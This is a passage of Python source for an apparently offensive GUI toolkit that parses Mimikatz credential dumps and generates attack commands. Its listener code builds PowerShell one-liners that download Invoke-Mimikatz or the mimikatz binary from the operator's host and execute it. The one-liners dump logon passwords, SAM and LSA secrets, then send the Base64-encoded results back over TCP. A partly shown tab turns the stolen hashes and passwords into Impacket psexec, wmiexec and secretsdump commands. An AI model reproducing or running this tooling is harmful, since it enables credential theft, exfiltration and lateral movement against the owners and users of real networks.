        hex_chars = sum(1 for c in text.lower() if c in '0123456789abcdef')
        if len(text) > 30 and hex_chars > len(text) * 0.8:
            return True
        
        # Check for strings with too many special characters (encoding artifacts)
        special_chars = sum(1 for c in text if not c.isalnum() and c not in ' .-_@')
        if special_chars > len(text) * 0.3:
            return True
        
        # Specific check for hex dump patterns (like the one you're seeing)
        if len(text) > 50 and re.match(r'^[0-9a-fA-F ]+$', text) and text.count(' ') > 10:
            return True
        
        # Check for patterns that look like memory dumps or binary data
        if len(text) > 40 and ' ' in text:
            # Split by spaces and check if most parts look like hex
            parts = text.split()
            if len(parts) > 8:  # Many space-separated parts
                hex_parts = sum(1 for part in parts if len(part) == 2 and all(c in '0123456789abcdefABCDEF' for c in part))
                if hex_parts > len(parts) * 0.7:  # More than 70% are 2-char hex values
                    return True
        
        return False

    def is_probably_hex_string(self, text):
        """Additional check for hex-like strings that should be filtered out"""
        import re
        
        # Remove spaces and check for hex patterns
        clean_text = text.replace(' ', '').replace('\t', '')
        
        # Check if it's all hex characters and reasonably long
        if len(clean_text) > 32:  # Longer than typical passwords
            try:
                int(clean_text, 16)
                return True
            except ValueError:
                pass
        
        # Check for patterns that look like hex dumps or memory data
        if len(text) > 20 and re.match(r'^[0-9a-fA-F\s]+$', text):
            return True
        
        # Check for pattern like "42 1e 9a 37 b1 8b 14..." (hex bytes with spaces)
        if re.match(r'^([0-9a-fA-F]{2}\s+){4,}', text):
            return True
        
        # More aggressive check: if more than 50% hex chars and has spaces, it's probably hex dump
        hex_chars = sum(1 for c in text.lower() if c in '0123456789abcdef')
        space_chars = text.count(' ')
        total_chars = len(text)
        
        if (total_chars > 30 and 
            hex_chars > total_chars * 0.5 and 
            space_chars > 5):  # Lots of spaces between hex chars
            return True
            
        return False

    def is_hex_dump_pattern(self, text):
        """Very specific check for hex dump patterns like '42 1e 9a 37 b1 8b...'"""
        import re
        
        # If it's longer than 30 chars and has lots of spaces, check for hex pattern
        if len(text) > 30 and text.count(' ') > 5:
            # Remove extra spaces and split
            parts = text.split()
            if len(parts) > 10:  # Many parts
                # Check if most parts are exactly 2 hex characters
                hex_parts = 0
                for part in parts:
                    if len(part) == 2 and all(c in '0123456789abcdefABCDEF' for c in part):
                        hex_parts += 1
                
                # If more than 80% are 2-char hex values, it's a hex dump
                if hex_parts > len(parts) * 0.8:
                    return True
        
        # Also check for the exact pattern in your example (spaces between hex pairs)
        if re.match(r'^[0-9a-fA-F]{2}(\s+[0-9a-fA-F]{2}){10,}', text):
            return True
            
        return False

    def copy_listbox_selection(self, listbox, item_type):
        """Copy selected item from listbox to clipboard with visual feedback"""
        selection = listbox.curselection()
        if not selection:
            self.show_status_message(f"No {item_type.lower()} selected", "#ff5555")
            return
        
        # Get the selected text
        selected_text = listbox.get(selection[0])
        
        # Extract just the credential part if format is "user: credential"
        if ": " in selected_text and item_type.lower() in ["password", "hash"]:
            credential_part = selected_text.split(": ", 1)[1]  # Get everything after first ": "
        else:
            credential_part = selected_text
        
        try:
            import pyperclip
            pyperclip.copy(credential_part)
            self.show_status_message(f"{item_type} copied to clipboard", "#00ff00")
        except ImportError:
            self.show_status_message("pyperclip not installed", "#ff5555")
        except Exception as e:
            self.show_status_message(f"Copy failed: {str(e)}", "#ff5555")

    def show_status_message(self, message, color):
        """Show a status message (placeholder - can be enhanced with actual status display)"""
        logger.info(f"Status: {message}")

    def clear_mimikatz_results(self, input_text, passwords_listbox, hashes_listbox, results_text):
        """Clear all Mimikatz parser results and input"""
        # Clear input
        input_text.delete("1.0", "end")
        placeholder_text = """Paste your Mimikatz output here...

Example formats supported:
- sekurlsa::logonpasswords
- sekurlsa::wdigest  
- sekurlsa::msv
- lsadump::sam
- lsadump::secrets"""
        input_text.insert("1.0", placeholder_text)
        
        # Clear listboxes
        passwords_listbox.delete(0, tk.END)
        hashes_listbox.delete(0, tk.END)
        
        # Clear results
        results_text.delete("1.0", "end")
        results_text.insert("1.0", "Parsed credentials will appear here...\n\nSupported formats:\n- Username:Domain:Password\n- Username:Domain:Hash\n- Detailed credential information")
        
        self.show_status_message("Results cleared", "#fefe00")

    def start_listener(self):
        """Start the network listener for Mimikatz output"""
        if self.is_listening:
            return
        
        try:
            # Start HTTP server first for hosting PowerShell scripts
            interface_name = self.selected_listener_interface.get()
            ip_address = self.get_interface_ip(interface_name)
            
            self.http_server_instance = start_http_server(self.http_port, ip_address)
            if not self.http_server_instance:
                logger.error("Failed to start HTTP server for script hosting")
                if hasattr(self, 'current_mimikatz_widgets') and self.current_mimikatz_widgets:
                    self.current_mimikatz_widgets['listener_status'].config(
                        text=f"HTTP server failed to start on port {self.http_port}", 
                        foreground='#ec1c3a'
                    )
                return
            
            logger.info(f"HTTP server started on {ip_address}:{self.http_port}")
            
            # Create socket with proper options
            self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Additional socket options to prevent address reuse issues
            try:
                self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            except AttributeError:
                # SO_REUSEPORT not available on all systems
                pass
            
            # Set socket timeout to avoid hanging
            self.listener_socket.settimeout(1.0)
            
            self.listener_socket.bind(('0.0.0.0', self.listener_port))
            self.listener_socket.listen(1)
            self.is_listening = True
            
            # Update UI
            if hasattr(self, 'current_mimikatz_widgets') and self.current_mimikatz_widgets:
                self.current_mimikatz_widgets['listener_status'].config(
                    text=f"Listening on port {self.listener_port} | HTTP on {self.http_port}", 
                    foreground='#91ddd3'
                )
                self.current_mimikatz_widgets['start_button'].config(state='disabled')
                self.current_mimikatz_widgets['stop_button'].config(state='normal')
            
            # Auto-generate PowerShell command when listener starts
            self.build_powershell_cmd()
            
            # Start listener thread
            self.listener_thread = threading.Thread(target=self.listen_for_connections, daemon=True)
            self.listener_thread.start()
            
        except Exception as e:
            if hasattr(self, 'current_mimikatz_widgets') and self.current_mimikatz_widgets:
                self.current_mimikatz_widgets['listener_status'].config(text=f"Error: {str(e)}", foreground='#ec1c3a')

    def stop_listener(self):
        """Stop the network listener"""
        self.is_listening = False
        
        # Stop HTTP server
        if self.http_server_instance:
            stop_http_server()
            self.http_server_instance = None
            logger.info("HTTP server stopped")
        
        # Force close the socket properly
        if self.listener_socket:
            try:
                # Shutdown the socket first to break any blocking calls
                self.listener_socket.shutdown(socket.SHUT_RDWR)
            except:
                pass
            try:
                self.listener_socket.close()
            except:
                pass
            self.listener_socket = None
        
        # Wait for thread to finish (with timeout)
        if self.listener_thread and self.listener_thread.is_alive():
            self.listener_thread.join(timeout=2.0)
        
        # Stop PowerShell marquee if it's running
        if self.powershell_marquee_job:
            self.root.after_cancel(self.powershell_marquee_job)
            self.powershell_marquee_job = None
        
        # Clear PowerShell command display and stored command
        if hasattr(self, 'ps_entry'):
            self.ps_entry.configure(state="normal")
            self.ps_entry.configure(background="#FEFE00", foreground="#000000")  # Force yellow background
            self.ps_entry.delete("1.0", tb.END)
            self.ps_entry.insert("1.0", "Listener stopped - no command available")
            self.ps_entry.configure(state="disabled")
            self.ps_entry.configure(background="#FEFE00", foreground="#000000")  # Force yellow background again
        
        # Clear stored PowerShell command
        if hasattr(self, 'full_ps_cmd'):
            self.full_ps_cmd = None
        
        # Update UI
        if hasattr(self, 'current_mimikatz_widgets') and self.current_mimikatz_widgets:
            self.current_mimikatz_widgets['listener_status'].config(text="Listener stopped", foreground='#fefe00')
            self.current_mimikatz_widgets['start_button'].config(state='normal')
            self.current_mimikatz_widgets['stop_button'].config(state='disabled')

    def listen_for_connections(self):
        """Listen for incoming connections and handle Mimikatz output"""
        while self.is_listening:
            try:
                # Use timeout to check is_listening periodically
                client_socket, address = self.listener_socket.accept()
                
                # Update status
                if hasattr(self, 'current_mimikatz_widgets') and self.current_mimikatz_widgets:
                    self.root.after(0, lambda: self.current_mimikatz_widgets['listener_status'].config(
                        text=f"Connected from {address[0]}", foreground='#91ddd3'))
                
                # Improved data reception - handle larger data and connection persistence
                logger.debug(f"TCP connection from {address[0]}")
                client_socket.settimeout(60.0)  # Extended to 60 second timeout for large outputs
                
                data = b""
                chunk_count = 0
                last_chunk_time = time.time()
                
                while True:
                    try:
                        chunk = client_socket.recv(16384)  # Further increased buffer size to 16KB
                        current_time = time.time()
                        
                        if not chunk:
                            logger.debug(f"No more data, received {len(data)} total bytes in {chunk_count} chunks")
                            break
                            
                        data += chunk
                        chunk_count += 1
                        logger.debug(f"Received chunk {chunk_count}, size: {len(chunk)} bytes, total: {len(data)} bytes")
                        last_chunk_time = current_time
                        
                        # Continue reading as long as we're getting data
                        # Don't break on partial chunks - keep reading until timeout or connection closes
                            
                    except socket.timeout:
                        # Check if we've received any data
                        if len(data) > 0:
                            logger.debug(f"Socket timeout after receiving {len(data)} bytes, processing data")
                            break
                        else:
                            logger.debug("Socket timeout with no data received")
                            break
                    except ConnectionResetError:
                        logger.debug(f"Connection reset by peer after {len(data)} bytes")
                        break
                    except Exception as e:
                        logger.debug(f"Error receiving data: {e}")
                        break
                
                # Additional wait to ensure all data is received
                if len(data) > 0:
                    logger.debug("Waiting additional 2 seconds to ensure complete transmission...")
                    time.sleep(2)
                    
                    # Try to read any remaining data
                    try:
                        client_socket.settimeout(1.0)  # Short timeout for final check
                        while True:
                            extra_chunk = client_socket.recv(16384)
                            if not extra_chunk:
                                break
                            data += extra_chunk
                            chunk_count += 1
                            logger.debug(f"Received extra chunk {chunk_count}, size: {len(extra_chunk)} bytes, total: {len(data)} bytes")
                    except (socket.timeout, ConnectionResetError, Exception):
                        # Expected - no more data available
                        pass
                
                # Parse the received Mimikatz output
                if data:
                    logger.debug(f"Processing {len(data)} bytes of received data")
                    mimikatz_output = data.decode('utf-8', errors='ignore')
                    logger.debug(f"Decoded to {len(mimikatz_output)} characters")
                    logger.debug(f"Data ends with: ...{mimikatz_output[-100:]}")
                    self.root.after(0, lambda: self.parse_received_mimikatz(mimikatz_output))
                else:
                    logger.debug("No data received")
                
                client_socket.close()
                
                # Update status back to listening
                if hasattr(self, 'current_mimikatz_widgets') and self.current_mimikatz_widgets:
                    self.root.after(0, lambda: self.current_mimikatz_widgets['listener_status'].config(
                        text=f"Listening on port {self.listener_port}", foreground='#91ddd3'))
                        
            except socket.timeout:
                # Timeout is normal, just continue the loop to check is_listening
                continue
            except Exception as e:
                if self.is_listening:  # Only show error if we're supposed to be listening
                    logger.debug(f"Listener exception: {e}")
                    if hasattr(self, 'current_mimikatz_widgets') and self.current_mimikatz_widgets:
                        self.root.after(0, lambda: self.current_mimikatz_widgets['listener_status'].config(
                            text=f"Connection error: {str(e)}", foreground='#ec1c3a'))
                break

    def parse_received_mimikatz(self, mimikatz_output):
        """Parse received Mimikatz output and populate the listboxes"""
        if hasattr(self, 'current_mimikatz_widgets') and self.current_mimikatz_widgets:
            logger.debug(f"Starting to parse received mimikatz output, length: {len(mimikatz_output)}")
            logger.debug(f"First 100 chars: {mimikatz_output[:100]}")
            
            # Check if the data appears to be Base64 encoded
            try:
                # Remove any whitespace and check if it looks like Base64
                cleaned_data = mimikatz_output.strip()
                
                # Enhanced Base64 detection
                if (len(cleaned_data) > 100 and  # Must be reasonably long
                    not any(keyword in cleaned_data.lower()[:200] for keyword in ['username', 'password', 'ntlm', 'authentication']) and  # Doesn't contain obvious Mimikatz keywords at start
                    len(cleaned_data.replace('\n', '').replace('\r', '').replace(' ', '')) % 4 == 0):  # Base64 length should be multiple of 4
                    
                    logger.debug("Data appears to be Base64 encoded, attempting decode...")
                    # Check character composition - should be mostly Base64 characters
                    base64_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\n\r '
                    if all(c in base64_chars for c in cleaned_data):
                        
                        # Try to decode as Base64
                        try:
                            # Remove whitespace and decode
                            base64_data = cleaned_data.replace('\n', '').replace('\r', '').replace(' ', '')
                            decoded_bytes = base64.b64decode(base64_data)
                            decoded_output = decoded_bytes.decode('utf-8', errors='ignore')
                            logger.debug(f"Successfully decoded Base64, new length: {len(decoded_output)}")
                            logger.debug(f"Decoded first 200 chars: {decoded_output[:200]}")
                            
                            # Verify decoded content looks like Mimikatz output
                            if any(keyword in decoded_output.lower() for keyword in ['username', 'password', 'ntlm', 'authentication', 'domain']):
                                logger.debug("Decoded content contains Mimikatz keywords, using decoded version")
                                # Update status to show we decoded Base64
                                self.current_mimikatz_widgets['listener_status'].config(
                                    text="Base64 data decoded successfully!", foreground='#91ddd3')
                                
                                # Use the decoded output
                                mimikatz_output = decoded_output
                            else:
                                logger.debug("Decoded content doesn't contain Mimikatz keywords, using raw data")
                                # Decoded content doesn't look like Mimikatz, use original
                                self.current_mimikatz_widgets['listener_status'].config(
                                    text="Decoded data invalid, using raw", foreground='#fefe00')
                                
                        except Exception as decode_error:
                            logger.debug(f"Base64 decode failed: {decode_error}")
                            # If Base64 decoding fails, treat as plain text
                            self.current_mimikatz_widgets['listener_status'].config(
                                text=f"Base64 decode failed, using raw data", foreground='#fefe00')
                            pass
                    else:
                        logger.debug("Data contains non-Base64 characters, treating as raw text")
                else:
                    logger.debug("Data does not appear to be Base64 encoded, using as-is")
                        
            except Exception as e:
                logger.debug(f"Base64 detection exception: {e}")
                # If detection fails, proceed with original data
                pass
            
            # Set the processed output in the text area
            logger.debug(f"Setting output in text area, final length: {len(mimikatz_output)}")
            self.current_mimikatz_widgets['output_area'].delete('1.0', tk.END)
            self.current_mimikatz_widgets['output_area'].insert('1.0', mimikatz_output)
            
            # Parse and populate listboxes using the existing method
            logger.debug("Calling comprehensive parsing method...")
            self.parse_mimikatz_output_for_listener()
            
            # Final status update
            self.current_mimikatz_widgets['listener_status'].config(
                text="Data received and parsed!", foreground='#91ddd3')

    def parse_mimikatz_output_for_listener(self):
        """Parse Mimikatz output for listener - uses the same comprehensive parsing as manual input"""
        if not (hasattr(self, 'current_mimikatz_widgets') and self.current_mimikatz_widgets):
            return
            
        widgets = self.current_mimikatz_widgets
        
        # Use the exact same parsing logic as the main parser
        logger.debug("Listener parsing using comprehensive method")
        self.parse_mimikatz_output(
            widgets['output_area'],
            widgets['passwords_listbox'],
            widgets['hashes_listbox'],
            widgets['results_text']
        )

    def update_listener_interface(self, event=None):
        """Update the listener interface selection"""
        logger.debug("Interface changed event triggered")
        logger.debug("update_listener_interface called")
        if hasattr(self, 'current_mimikatz_widgets') and self.current_mimikatz_widgets:
            selected_interface = self.selected_listener_interface.get()
            logger.debug(f"Interface changed to: {selected_interface}")
            if not self.is_listening:
                self.current_mimikatz_widgets['listener_status'].config(
                    text=f"Interface set to {selected_interface}", foreground='#fefe00')
                # Auto-regenerate PowerShell command with new interface
                logger.debug("Regenerating PowerShell command...")
                self.build_powershell_cmd()
            else:
                logger.debug("Listener is running, not updating command")

    def get_interface_ip(self, interface_name):
        """Get the IP address for a given network interface"""
        try:
            import psutil
            addresses = psutil.net_if_addrs()
            logger.debug(f"Looking for IP of interface '{interface_name}'")
            
            if interface_name in addresses:
                for addr in addresses[interface_name]:
                    if addr.family == 2:  # AF_INET (IPv4)
                        logger.debug(f"Found IP {addr.address} for interface {interface_name}")
                        return addr.address
            
            logger.error(f"Could not find IPv4 address for interface {interface_name}")
            return "127.0.0.1"  # Fallback to localhost
        except Exception as e:
            logger.error(f"Error getting IP for interface {interface_name}: {e}")
            return "127.0.0.1"  # Fallback to localhost

    def update_listener_port(self, event=None):
        """Update the listener port from the entry widget"""
        logger.debug("update_listener_port called")
        if hasattr(self, 'current_mimikatz_widgets') and self.current_mimikatz_widgets:
            try:
                new_port = int(self.current_mimikatz_widgets['port_entry'].get())
                logger.debug(f"Port changed to: {new_port}")
                if 1 <= new_port <= 65535:
                    self.listener_port = new_port
                    if not self.is_listening:
                        self.current_mimikatz_widgets['listener_status'].config(
                            text=f"Port set to {new_port}", foreground='#fefe00')
                        # Auto-regenerate PowerShell command with new port
                        logger.debug("Regenerating PowerShell command...")
                        self.build_powershell_cmd()
                else:
                    self.current_mimikatz_widgets['listener_status'].config(
                        text="Port must be 1-65535", foreground='#ec1c3a')
            except ValueError:
                self.current_mimikatz_widgets['listener_status'].config(
                    text="Invalid port number", foreground='#ec1c3a')

    def build_powershell_cmd(self):
        """Build PowerShell command for connecting to the listener"""
        if not hasattr(self, 'selected_listener_interface') or not hasattr(self, 'port_entry') or not hasattr(self, 'ps_entry'):
            logger.debug("build_powershell_cmd called but missing required attributes")
            logger.debug(f"Has selected_listener_interface: {hasattr(self, 'selected_listener_interface')}")
            logger.debug(f"Has port_entry: {hasattr(self, 'port_entry')}")
            logger.debug(f"Has ps_entry: {hasattr(self, 'ps_entry')}")
            return
        
        # Get the actual IP address from the selected interface
        interface_name = self.selected_listener_interface.get()
        ip_address = self.get_interface_ip(interface_name)
        port = self.port_entry.get()
        
        logger.debug(f"Building PowerShell command with Interface: {interface_name}, IP: {ip_address}, Port: {port}")
        
        # Simple PowerShell command using working Invoke-Mimikatz.ps1 version
        # Using hardcoded values as specified by user
        
        # Primary method: Simple command that just works
        ps_command = f'$u="http://{ip_address}:{getattr(self, "http_port", 8080)}/Invoke-Mimikatz.ps1";$m="{ip_address}";$p={port};$c=New-Object Net.Sockets.TcpClient($m,$p);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;IEX (New-Object Net.WebClient).DownloadString($u);$r=Invoke-Mimikatz -Command \'"privilege::debug" "token::elevate" "sekurlsa::logonpasswords full" "lsadump::sam" "lsadump::secrets" "exit"\';$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($r));$w.WriteLine($b);Start-Sleep -s 3;$w.Close();$s.Close();$c.Close()'
        
        # Store the full command for copying
        self.full_ps_cmd = ps_command
        
        # Alternative commands for troubleshooting (using dynamic values for consistency)
        self.simple_ps_cmd = f'$m="{ip_address}";$p={port};$c=New-Object Net.Sockets.TcpClient($m,$p);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;$r="Connection test from target - no mimikatz executed";$w.WriteLine($r);$w.Close();$s.Close();$c.Close()'
        
        self.debug_ps_cmd = f'$u="http://{ip_address}:{getattr(self, "http_port", 8080)}/Fixed-Mimikatz.ps1";try{{$wc=New-Object Net.WebClient;$script=$wc.DownloadString($u);$wc.Dispose();Write-Host "Fixed script downloaded, length: $($script.Length)";IEX $script;Write-Host "Testing Invoke-SimpleMimikatz...";$test=Invoke-SimpleMimikatz -Command \'"exit"\';Write-Host "Test completed: $test"}}catch{{Write-Host "Error: $($_.Exception.Message)"}}'
        
        # Alternative method using direct mimikatz binary download
        self.binary_ps_cmd = f'$m="{ip_address}";$p={port};try{{$url="https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip";$tmp="$env:TEMP\\mz.zip";$ext="$env:TEMP\\mz";(New-Object Net.WebClient).DownloadFile($url,$tmp);Add-Type -A System.IO.Compression.FileSystem;[IO.Compression.ZipFile]::ExtractToDirectory($tmp,$ext);$mz="$ext\\x64\\mimikatz.exe";$r=& $mz \'"privilege::debug" "sekurlsa::logonpasswords" "exit"\' 2>&1 | Out-String;Remove-Item $tmp,$ext -Recurse -Force;$c=New-Object Net.Sockets.TcpClient($m,$p);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.WriteLine($r);$w.Close();$s.Close();$c.Close()}}catch{{Write-Host "Binary method failed: $_"}}'
        
        logger.debug(f"Generated PowerShell command: {ps_command[:100]}...")
        
        # Update the display using marquee scrolling (similar to MSF command)
        self.ps_entry.configure(state="normal")
        self.ps_entry.configure(background="#FEFE00", foreground="#000000")  # Force yellow background
        self.ps_entry.delete("1.0", tb.END)
        
        # If command is longer than display width, start marquee
        display_width = 35
        if len(ps_command) > display_width:
            self.ps_entry.insert("1.0", ps_command[:display_width])
            self.ps_marquee_position = 0
            self.start_ps_marquee(ps_command)
        else:
            self.ps_entry.insert("1.0", ps_command)
        
        self.ps_entry.configure(state="disabled")
        self.ps_entry.configure(background="#FEFE00", foreground="#000000")  # Force yellow background again
        logger.debug("PowerShell command display updated")

    def start_ps_marquee(self, full_command):
        """Start marquee scrolling for PowerShell command (similar to MSF marquee)"""
        def update_ps_marquee():
            if hasattr(self, 'ps_entry') and self.is_listening:  # Only scroll while listening
                display_width = 35
                if len(full_command) > display_width:
                    # Calculate display window
                    start_pos = self.ps_marquee_position
                    end_pos = start_pos + display_width
                    
                    if end_pos <= len(full_command):
                        display_text = full_command[start_pos:end_pos]
                    else:
                        # Wrap around
                        remaining = end_pos - len(full_command)
                        display_text = full_command[start_pos:] + " | " + full_command[:remaining-3]
                    
                    # Update display
                    self.ps_entry.configure(state="normal")
                    self.ps_entry.configure(background="#FEFE00", foreground="#000000")  # Force yellow background
                    self.ps_entry.delete("1.0", tb.END)
                    self.ps_entry.insert("1.0", display_text)
                    self.ps_entry.configure(state="disabled")
                    self.ps_entry.configure(background="#FEFE00", foreground="#000000")  # Force yellow background again
                    
                    # Move position
                    self.ps_marquee_position = (self.ps_marquee_position + 1) % (len(full_command) + 3)
                    
                    # Schedule next update
                    self.powershell_marquee_job = self.root.after(150, update_ps_marquee)
        
        # Start the marquee
        if hasattr(self, 'powershell_marquee_job') and self.powershell_marquee_job:
            self.root.after_cancel(self.powershell_marquee_job)
        self.powershell_marquee_job = self.root.after(150, update_ps_marquee)

    def on_closing(self):
        """Clean up listener and HTTP server before closing the application"""
        if self.is_listening:
            self.stop_listener()
        
        # Ensure HTTP server is stopped
        if self.http_server_instance:
            stop_http_server()
            
        self.root.destroy()

    def export_mimikatz_results(self, results_text):
        """Export parsing results to clipboard in various formats"""
        results_content = results_text.get("1.0", "end-1c")
        
        if not results_content or "Parsed credentials will appear here" in results_content:
            self.show_status_message("No results to export", "#ff5555")
            return
        
        try:
            import pyperclip
            from datetime import datetime
            
            # Format the results for easy use
            export_content = f"""=== MIMIKATZ PARSING RESULTS ===
Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

{results_content}
"""
            
            pyperclip.copy(export_content)
            self.show_status_message("Results exported to clipboard", "#00ff00")
            
        except ImportError:
            self.show_status_message("pyperclip not installed", "#ff5555")
        except Exception as e:
            self.show_status_message(f"Export failed: {str(e)}", "#ff5555")

    def create_impacket_rubeus_tab(self, parent_frame):
        """Impacket/Rubeus command generator using credentials from Mimikatz parser"""
        
        # Main container with dark styling
        main_frame = tb.Frame(parent_frame, bootstyle="dark")
        main_frame.configure(style="TFrame")
        main_frame.pack(fill=tb.BOTH, expand=True, padx=10, pady=10)
        
        # Title
        title_label = tb.Label(main_frame, text="IMPACKET / RUBEUS COMMAND GENERATOR", 
                              font=("Consolas", 16, "bold"),
                              style="StatusLabel.TLabel")
        title_label.pack(pady=(0, 20))
        
        # Credential import section
        import_frame = tb.Frame(main_frame, bootstyle="dark")
        import_frame.configure(style="TFrame")
        import_frame.pack(fill=tb.X, pady=(0, 20))
        
        import_label = tb.Label(import_frame, text="IMPORT CREDENTIALS FROM MIMIKATZ:", 
                               style="SectionLabel.TLabel")
        import_label.pack(anchor="w", pady=(0, 10))
        
        # Import button and status
        import_button_frame = tb.Frame(import_frame, bootstyle="dark")
        import_button_frame.configure(style="TFrame")
        import_button_frame.pack(fill=tb.X)
        
        import_creds_button = tb.Button(import_button_frame, text="Import from Mimikatz Parser", 
                                       bootstyle="info", width=25,
                                       command=lambda: self.import_mimikatz_credentials())
        import_creds_button.pack(side=tb.LEFT, padx=(0, 10))
        
        self.import_status = tb.Label(import_button_frame, text="No credentials imported", 
                                     foreground="#fefe00", background="#000000",
                                     font=("Consolas", 10))
        self.import_status.pack(side=tb.LEFT)
        
        # Target configuration section
        target_frame = tb.Frame(main_frame, bootstyle="dark")
        target_frame.configure(style="TFrame")
        target_frame.pack(fill=tb.X, pady=(0, 20))
        
        target_label = tb.Label(target_frame, text="TARGET CONFIGURATION:", 
                               style="SectionLabel.TLabel")
        target_label.pack(anchor="w", pady=(0, 10))
        
        # Target IP and Domain in horizontal layout
        target_config_frame = tb.Frame(target_frame, bootstyle="dark")
        target_config_frame.configure(style="TFrame")
        target_config_frame.pack(fill=tb.X)
        
        # Target IP
        target_ip_frame = tb.Frame(target_config_frame, bootstyle="dark")
        target_ip_frame.configure(style="TFrame")
        target_ip_frame.pack(side=tb.LEFT, fill=tb.X, expand=True, padx=(0, 10))
        
        target_ip_label = tb.Label(target_ip_frame, text="Target IP/Hostname:", 
                                  foreground="#91ddd3", background="#000000",
                                  font=("Consolas", 10, "bold"))
        target_ip_label.pack(anchor="w")
        
        # IP entry with direct styling
        self.target_ip_entry = tk.Entry(target_ip_frame, font=("Consolas", 10),
                                       width=20,
                                       background="#000000", foreground="#fefe00",
                                       insertbackground="#fefe00",
                                       selectbackground="#333333",
                                       selectforeground="#fefe00",
                                       highlightbackground="#333333",
                                       highlightcolor="#fefe00",
                                       borderwidth=1, relief="solid")
        self.target_ip_entry.pack(fill=tb.X, pady=(2, 0))
        self.target_ip_entry.insert(0, "192.168.1.100")
        
        # Domain
        domain_frame = tb.Frame(target_config_frame, bootstyle="dark")
        domain_frame.configure(style="TFrame")
        domain_frame.pack(side=tb.LEFT, fill=tb.X, expand=True)
        
        domain_label = tb.Label(domain_frame, text="Domain:", 
                               foreground="#91ddd3", background="#000000",
                               font=("Consolas", 10, "bold"))
        domain_label.pack(anchor="w")
        
        # Domain entry with direct styling
        self.domain_entry = tk.Entry(domain_frame, font=("Consolas", 10),
                                    width=20,
                                    background="#000000", foreground="#fefe00",
                                    insertbackground="#fefe00",
                                    selectbackground="#333333",
                                    selectforeground="#fefe00",
                                    highlightbackground="#333333",
                                    highlightcolor="#fefe00",
                                    borderwidth=1, relief="solid")
        self.domain_entry.pack(fill=tb.X, pady=(2, 0))
        self.domain_entry.insert(0, "DOMAIN.LOCAL")
        
        # Tool selection section
        tool_frame = tb.Frame(main_frame, bootstyle="dark")
        tool_frame.configure(style="TFrame")
        tool_frame.pack(fill=tb.X, pady=(0, 20))
        
        tool_label = tb.Label(tool_frame, text="SELECT TOOL & TECHNIQUE:", 
                             style="SectionLabel.TLabel")
        tool_label.pack(anchor="w", pady=(0, 10))
        
        # Tool selection dropdown
        tool_selection_frame = tb.Frame(tool_frame, bootstyle="dark")
        tool_selection_frame.configure(style="TFrame")
        tool_selection_frame.pack(fill=tb.X)
        
        self.selected_tool = tb.StringVar(value="psexec.py")
        tools = [
            "psexec.py - Remote command execution",
            "wmiexec.py - WMI command execution", 
            "smbexec.py - SMB command execution",
            "dcomexec.py - DCOM command execution",
            "secretsdump.py - Extract secrets"
            # "GetNPUsers.py - ASREPRoast attack",
            # "GetUserSPNs.py - Kerberoast attack",
            # "goldenPac.py - Golden ticket attack",
            # "ticketer.py - Silver/Golden ticket creation",
            # "rubeus.exe - Kerberos attacks"
        ]
        
        # Create custom style for the tool dropdown
        tool_dropdown_style = tb.Style()
        tool_dropdown_style.configure("ToolCombo.TCombobox", 
                                      fieldbackground="#000000",
                                      foreground="#fefe00",
                                      bordercolor="#333333",
                                      lightcolor="#333333",
                                      darkcolor="#333333",
                                      selectbackground="#333333",
                                      selectforeground="#fefe00",
                                      arrowcolor="#fefe00",
                                      focuscolor="#fefe00")
        
        # Configure the dropdown list styling
        tool_dropdown_style.map("ToolCombo.TCombobox",
                                fieldbackground=[('readonly', '#000000')],
                                foreground=[('readonly', '#fefe00')],
                                selectbackground=[('readonly', '#333333')],
                                selectforeground=[('readonly', '#fefe00')])
        
        tool_dropdown = tb.Combobox(tool_selection_frame, textvariable=self.selected_tool,
                                   values=tools, state="readonly", width=50,
                                   font=("Consolas", 10), style="ToolCombo.TCombobox")
        tool_dropdown.pack(fill=tb.X)
        tool_dropdown.bind('<<ComboboxSelected>>', self.update_tool_selection)
        
        # Credential selection section - Two columns
        cred_frame = tb.Frame(main_frame, bootstyle="dark")
        cred_frame.configure(style="TFrame")
        cred_frame.pack(fill=tb.X, pady=(0, 20))
        
        cred_label = tb.Label(cred_frame, text="SELECT CREDENTIALS:", 
                             style="SectionLabel.TLabel")
        cred_label.pack(anchor="w", pady=(0, 10))
        
        # Credentials display - horizontal layout
        creds_display_frame = tb.Frame(cred_frame, bootstyle="dark")
        creds_display_frame.configure(style="TFrame")
        creds_display_frame.pack(fill=tb.X)
        
        # Password credentials (left)
        pass_cred_frame = tb.Frame(creds_display_frame, bootstyle="dark")
        pass_cred_frame.configure(style="TFrame")
        pass_cred_frame.pack(side=tb.LEFT, fill=tb.BOTH, expand=True, padx=(0, 5))
        
        pass_cred_label = tb.Label(pass_cred_frame, text="Password Credentials:", 
                                  foreground="#00ff00", background="#000000",
                                  font=("Consolas", 10, "bold"))
        pass_cred_label.pack(anchor="w")
        
        self.password_creds_listbox = tk.Listbox(pass_cred_frame, height=6,
                                                background="#000000", foreground="#00ff00",
                                                font=("Consolas", 9),
                                                selectbackground="#333333",
                                                selectforeground="#00ff00")
        self.password_creds_listbox.pack(fill=tb.BOTH, expand=True, pady=(2, 0))
        # Force colors after creation
        self.password_creds_listbox.configure(background="#000000", foreground="#00ff00")
        self.password_creds_listbox.bind('<<ListboxSelect>>', self.on_password_select)
        
        # Hash credentials (right)
        hash_cred_frame = tb.Frame(creds_display_frame, bootstyle="dark")
        hash_cred_frame.configure(style="TFrame")
        hash_cred_frame.pack(side=tb.LEFT, fill=tb.BOTH, expand=True, padx=(5, 0))
        
        hash_cred_label = tb.Label(hash_cred_frame, text="Hash Credentials:", 
                                  foreground="#ec1c3a", background="#000000",
                                  font=("Consolas", 10, "bold"))
        hash_cred_label.pack(anchor="w")
        
        self.hash_creds_listbox = tk.Listbox(hash_cred_frame, height=6,
                                            background="#000000", foreground="#ec1c3a",
                                            font=("Consolas", 9),
